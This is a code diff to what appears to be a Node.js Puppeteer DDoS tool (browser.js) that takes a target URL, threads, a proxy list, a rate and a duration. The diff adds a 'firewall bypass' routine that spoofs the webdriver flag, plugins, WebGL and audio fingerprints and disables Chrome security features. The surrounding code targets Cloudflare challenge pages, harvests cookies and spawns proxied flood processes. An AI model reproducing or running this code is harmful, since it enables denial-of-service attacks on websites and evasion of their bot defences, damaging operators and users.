@@ -16,6 +16,65 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
+// ========== FIREWALL BYPASS TECHNIQUES ==========
+const bypassFirewall = async (page) => {
+    await page.evaluateOnNewDocument(() => {
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+        
+        window.chrome = { runtime: {}, loadTimes: () => {}, csi: () => {}, app: {} };
+        
+        const originalQuery = window.navigator.permissions.query;
+        window.navigator.permissions.query = (parameters) => (
+            parameters.name === 'notifications' ?
+                Promise.resolve({ state: Notification.permission }) :
+                originalQuery(parameters)
+        );
+
+        const originalGetChannelData = AudioBuffer.prototype.getChannelData;
+        AudioBuffer.prototype.getChannelData = function() {
+            const result = originalGetChannelData.apply(this, arguments);
+            for (let i = 0; i < result.length; i++) {
+                result[i] += (Math.random() * 0.0001) - 0.00005;
+            }
+            return result;
+        };
+
+        const getParameter = WebGLRenderingContext.prototype.getParameter;
+        WebGLRenderingContext.prototype.getParameter = function(parameter) {
+            if (parameter === 37445) return 'Intel Inc.';
+            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
+            return getParameter.apply(this, arguments);
+        };
+    });
+};
+
+const getFirewallBypassArgs = () => [
+    '--disable-features=site-per-process',
+    '--disable-ipc-flooding-protection', 
+    '--disable-backgrounding-occluded-windows',
+    '--disable-background-timer-throttling',
+    '--disable-default-apps',
+    '--disable-extensions',
+    '--disable-translate',
+    '--disable-web-security',
+    '--disable-xss-auditor',
+    '--no-pings',
+    '--use-gl=swiftshader',
+    '--disable-software-rasterizer',
+    '--no-default-browser-check',
+    '--disable-background-networking',
+    '--disable-client-side-phishing-detection',
+    '--disable-sync',
+    '--disable-hang-monitor',
+    '--disable-prompt-on-repost',
+    '--disable-domain-reliability',
+    '--disable-component-update',
+    '--disable-features=TranslateUI,BlinkGenPropertyTrees,site-per-process'
+];
+// ========== END FIREWALL BYPASS ==========
+
 // Command-line argument validation
 if (process.argv.length < 6) {
     console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
@@ -374,7 +433,9 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
             '--disable-remote-fonts',
             '--force-color-profile=srgb',
             '--enable-quic',
-            '--enable-features=PostQuantumKyber'
+            '--enable-features=PostQuantumKyber',
+            // ========== TAMBAHKAN FIREWALL BYPASS ARGS ==========
+            ...getFirewallBypassArgs()
         ],
         defaultViewport: {
             width: 360,
@@ -393,6 +454,8 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
         const client = page._client();
 
         await spoofFingerprint(page);
+        // ========== TAMBAHKAN FIREWALL BYPASS ==========
+        await bypassFirewall(page);
 
         page.on('framenavigated', (frame) => {
             if (frame.url().includes('challenges.cloudflare.com')) {
@@ -444,7 +507,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     }
 };
 
-// Thread handling - ĐÃ SỬA: Spawn liên tục như browser1.js
+// Thread handling - ĐÃ SỬA: Spawn liên tục seperti browser1.js
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
         done(null, { task, currentTask: queue.length() });
@@ -469,7 +532,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
             console.log(cookieInfo);
 
             try {
-                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs với proxy: ${maskProxy(browserProxy)}`);
+                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs dengan proxy: ${maskProxy(browserProxy)}`);
                 
                 // SPAWN LIÊN TỤC NHƯ BROWSER1.JS
                 const floodProcess = spawn('node', [
